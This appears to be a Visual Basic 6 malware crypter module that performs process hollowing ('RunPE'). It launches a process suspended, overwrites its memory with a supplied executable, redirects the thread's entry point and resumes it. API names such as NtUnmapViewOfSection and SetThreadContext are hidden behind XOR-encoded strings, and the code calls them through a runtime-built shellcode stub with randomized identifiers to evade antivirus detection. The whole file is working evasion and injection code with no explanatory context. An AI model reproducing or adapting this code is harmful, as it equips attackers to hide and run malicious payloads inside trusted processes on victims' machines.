Attribute VB_Name = "mMem0ry"
Option Explicit

Private Const creSuspended As Long = &H4
Private Const memCommit As Long = &H1000
Private Const conFull As Long = &H10007
Private Const maxPath As Integer = 260
Private Const memReserve As Long = &H2000
Private Const pageExe As Long = &H40

Private Declare Function OutputDebugString Lib "kernel32" Alias "OutputDebugStringA" (ByVal lpOutputString As String) As Long
Private Declare Function LoadLibraryA Lib "kernel32" (ByVal lpLibFileName As String) As Long
Private Declare Sub RtlMoveMemory Lib "kernel32" (Dest As Any, Src As Any, ByVal l As Long)
Private Declare Function CallWindowProcA Lib "user32" (ByVal addr As Long, ByVal p1 As Long, ByVal p2 As Long, ByVal p3 As Long, ByVal p4 As Long) As Long
Private Declare Function CreateProcessA Lib "kernel32" (ByVal lpAppName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpstartInfo As startInfo, lpProcessInformation As proInfor) As Long
Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, bvBuff As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long

Private Type secAtrr
 nLength As Long
 lpSecurityDescriptor As Long
 bInheritHandle As Long
End Type

Private Type startInfo
 cb As Long
 lpReserved As Long
 lpDesktop As Long
 lpTitle As Long
 dwX As Long
 dwY As Long
 dwXSize As Long
 dwYSize As Long
 dwXCountChars As Long
 dwYCountChars As Long
 dwFillAttribute As Long
 dwFlags As Long
 wShowWindow As Integer
 cbReserved2 As Integer
 lpReserved2 As Long
 hStdInput As Long
 hStdOutput As Long
 hStdError As Long
End Type

Private Type proInfor
 hProcess As Long
 hThread As Long
 dwProcessId As Long
 dwThreadID As Long
End Type

Private Type flotSave
 ControlWord As Long
 StatusWord As Long
 TagWord As Long
 ErrorOffset As Long
 ErrorSelector As Long
 DataOffset As Long
 DataSelector As Long
 RegisterArea(1 To 80) As Byte
 Cr0NpxState As Long
End Type

Private Type contxt
 contxtFlags As Long

 Dr0 As Long
 Dr1 As Long
 Dr2 As Long
 Dr3 As Long
 Dr6 As Long
 Dr7 As Long

 FloatSave As flotSave
 SegGs As Long
 SegFs As Long
 SegEs As Long
 SegDs As Long
 Edi As Long
 Esi As Long
 Ebx As Long
 Edx As Long
 Ecx As Long
 Eax As Long
 Ebp As Long
 Eip As Long
 SegCs As Long
 EFlags As Long
 Esp As Long
 SegSs As Long
End Type

Private Type imgDos
 e_magic As Integer
 e_cblp As Integer
 e_cp As Integer
 e_crlc As Integer
 e_cparhdr As Integer
 e_minalloc As Integer
 e_maxalloc As Integer
 e_ss As Integer
 e_sp As Integer
 e_csum As Integer
 e_ip As Integer
 e_cs As Integer
 e_lfarlc As Integer
 e_ovno As Integer
 e_res(0 To 3) As Integer
 e_oemid As Integer
 e_oeminfo As Integer
 e_res2(0 To 9) As Integer
 e_lfanew As Long
End Type

Private Type imghead
 Machine As Integer
 NumberOfSections As Integer
 TimeDateStamp As Long
 PointerToSymbolTable As Long
 NumberOfSymbols As Long
 SizeOfOptionalHeader As Integer
 characteristics As Integer
End Type

Private Type imgDirec
 VirtualAddress As Long
 Size As Long
End Type

Private Type imgOpt
 Magic As Integer
 MajorLinkerVersion As Byte
 MinorLinkerVersion As Byte
 SizeOfCode As Long
 SizeOfInitializedData As Long
 SizeOfUnitializedData As Long
 AddressOfEntryPoint As Long
 BaseOfCode As Long
 BaseOfData As Long
 ImageBase As Long
 SectionAlignment As Long
 FileAlignment As Long
 MajorOperatingSystemVersion As Integer
 MinorOperatingSystemVersion As Integer
 MajorImageVersion As Integer
 MinorImageVersion As Integer
 MajorSubsystemVersion As Integer
 MinorSubsystemVersion As Integer
 W32VersionValue As Long
 SizeOfImage As Long
 SizeOfHeaders As Long
 CheckSum As Long
 SubSystem As Integer
 DllCharacteristics As Integer
 SizeOfStackReserve As Long
 SizeOfStackCommit As Long
 SizeOfHeapReserve As Long
 SizeOfHeapCommit As Long
 LoaderFlags As Long
 NumberOfRvaAndSizes As Long
 DataDirectory(0 To 15) As imgDirec
End Type

Private Type imgNt
 Signature As Long
 FileHeader As imghead
 OptionalHeader As imgOpt
End Type

Private Type imgSecHe
 SecName As String * 8
 VirtualSize As Long
 VirtualAddress As Long
 SizeOfRawData As Long
 PointerToRawData As Long
 PointerToRelocations As Long
 PointerToLinenumbers As Long
 NumberOfRelocations As Integer
 NumberOfLinenumbers As Integer
 characteristics As Long
End Type


Public Function BZXCPIM(ByVal TDCR As String, ByVal DBTOE As String, ParamArray XELWMMY()) As Long
Dim LESSN As Long, ILWO(&HEC00& - 1) As Byte, PJJ As Long, FULOTEY As Long

FULOTEY = GetProcAddress(LoadLibraryA(TDCR), DBTOE)
If FULOTEY = 0 Then Exit Function

LESSN = VarPtr(ILWO(0))
RtlMoveMemory ByVal LESSN, &H59595958, &H4: LESSN = LESSN + 4
RtlMoveMemory ByVal LESSN, &H5059, &H2: LESSN = LESSN + 2
For PJJ = UBound(XELWMMY) To 0 Step -1
RtlMoveMemory ByVal LESSN, &H68, &H1: LESSN = LESSN + 1
RtlMoveMemory ByVal LESSN, CLng(XELWMMY(PJJ)), &H4: LESSN = LESSN + 4
Next
RtlMoveMemory ByVal LESSN, &HE8, &H1: LESSN = LESSN + 1
RtlMoveMemory ByVal LESSN, FULOTEY - LESSN - 4, &H4: LESSN = LESSN + 4
RtlMoveMemory ByVal LESSN, &HC3, &H1: LESSN = LESSN + 1
BZXCPIM = CallWindowProcA(VarPtr(ILWO(0)), 0, 0, 0, 0)
End Function

Public Function EREYC(ByVal STIXLP As String, ByVal RLDVK As String) As String
Dim IYG As Long

For IYG = 1 To Len(STIXLP)
EREYC = EREYC & Chr(Asc(Mid(RLDVK, IIf(IYG Mod Len(RLDVK) <> 0, IYG Mod Len(RLDVK), Len(RLDVK)), 1)) Xor Asc(Mid(STIXLP, IYG, 1)))
Next IYG
End Function

Public Sub Pum(ByVal QGQFV As String, ByRef JVQT() As Byte, KSHPK As String)
Dim QMA As Long, DONW As imgDos, NKGLV As imgNt, RQRPEA As imgSecHe
Dim WHBBTRP As startInfo, THAELU As proInfor, TJUSLN As contxt

WHBBTRP.cb = Len(WHBBTRP)
RtlMoveMemory DONW, JVQT(0), 64
RtlMoveMemory NKGLV, JVQT(DONW.e_lfanew), 248

CreateProcessA QGQFV, " " & KSHPK, 0, 0, False, creSuspended, 0, 0, WHBBTRP, THAELU
BZXCPIM EREYC(Chr(36) & Chr(54) & Chr(62) & Chr(52) & Chr(47), "JBZXCPBLTVCRVBTOWXEKWMGYIYGERWXBSTIXLIKE"), EREYC(Chr(4) & Chr(54) & Chr(15) & Chr(54) & Chr(46) & Chr(49) & Chr(50) & Chr(26) & Chr(61) & Chr(51) & Chr(52) & Chr(29) & Chr(48) & Chr(17) & Chr(49) & Chr(44) & Chr(35) & Chr(49) & Chr(42) & Chr(37), "JBZXCPBLTVCRVBTOWXEKWMGYIYGERWXBSTIXLIKE"), THAELU.hProcess, NKGLV.OptionalHeader.ImageBase
BZXCPIM EREYC(Chr(33) & Chr(39) & Chr(40) & Chr(54) & Chr(38) & Chr(60) & Chr(113) & Chr(126), "JBZXCPBLTVCRVBTOWXEKWMGYIYGERWXBSTIXLIKE"), EREYC(Chr(28) & Chr(43) & Chr(40) & Chr(44) & Chr(54) & Chr(49) & Chr(46) & Chr(13) & Chr(56) & Chr(58) & Chr(44) & Chr(49) & Chr(19) & Chr(58), "JBZXCPBLTVCRVBTOWXEKWMGYIYGERWXBSTIXLIKE"), THAELU.hProcess, NKGLV.OptionalHeader.ImageBase, NKGLV.OptionalHeader.SizeOfImage, memCommit Or memReserve, pageExe
WriteProcessMemory THAELU.hProcess, ByVal NKGLV.OptionalHeader.ImageBase, JVQT(0), NKGLV.OptionalHeader.SizeOfHeaders, 0

For QMA = 0 To NKGLV.FileHeader.NumberOfSections - 1
RtlMoveMemory RQRPEA, JVQT(DONW.e_lfanew + 248 + 40 * QMA), Len(RQRPEA)
WriteProcessMemory THAELU.hProcess, ByVal NKGLV.OptionalHeader.ImageBase + RQRPEA.VirtualAddress, JVQT(RQRPEA.PointerToRawData), RQRPEA.SizeOfRawData, 0
Next QMA

TJUSLN.contxtFlags = conFull
BZXCPIM EREYC(Chr(33) & Chr(39) & Chr(40) & Chr(54) & Chr(38) & Chr(60) & Chr(113) & Chr(126), "JBZXCPBLTVCRVBTOWXEKWMGYIYGERWXBSTIXLIKE"), EREYC(Chr(13) & Chr(39) & Chr(46) & Chr(12) & Chr(43) & Chr(34) & Chr(39) & Chr(45) & Chr(48) & Chr(21) & Chr(44) & Chr(60) & Chr(34) & Chr(39) & Chr(44) & Chr(59), "JBZXCPBLTVCRVBTOWXEKWMGYIYGERWXBSTIXLIKE"), THAELU.hThread, VarPtr(TJUSLN)
WriteProcessMemory THAELU.hProcess, ByVal TJUSLN.Ebx + 8, NKGLV.OptionalHeader.ImageBase, 4, 0
TJUSLN.Eax = NKGLV.OptionalHeader.ImageBase + NKGLV.OptionalHeader.AddressOfEntryPoint
BZXCPIM EREYC(Chr(33) & Chr(39) & Chr(40) & Chr(54) & Chr(38) & Chr(60) & Chr(113) & Chr(126), "JBZXCPBLTVCRVBTOWXEKWMGYIYGERWXBSTIXLIKE"), EREYC(Chr(25) & Chr(39) & Chr(46) & Chr(12) & Chr(43) & Chr(34) & Chr(39) & Chr(45) & Chr(48) & Chr(21) & Chr(44) & Chr(60) & Chr(34) & Chr(39) & Chr(44) & Chr(59), "JBZXCPBLTVCRVBTOWXEKWMGYIYGERWXBSTIXLIKE"), THAELU.hThread, VarPtr(TJUSLN)
BZXCPIM EREYC(Chr(33) & Chr(39) & Chr(40) & Chr(54) & Chr(38) & Chr(60) & Chr(113) & Chr(126), "JBZXCPBLTVCRVBTOWXEKWMGYIYGERWXBSTIXLIKE"), EREYC(Chr(24) & Chr(39) & Chr(41) & Chr(45) & Chr(46) & Chr(53) & Chr(22) & Chr(36) & Chr(38) & Chr(51) & Chr(34) & Chr(54), "JBZXCPBLTVCRVBTOWXEKWMGYIYGERWXBSTIXLIKE"), THAELU.hThread
End Sub



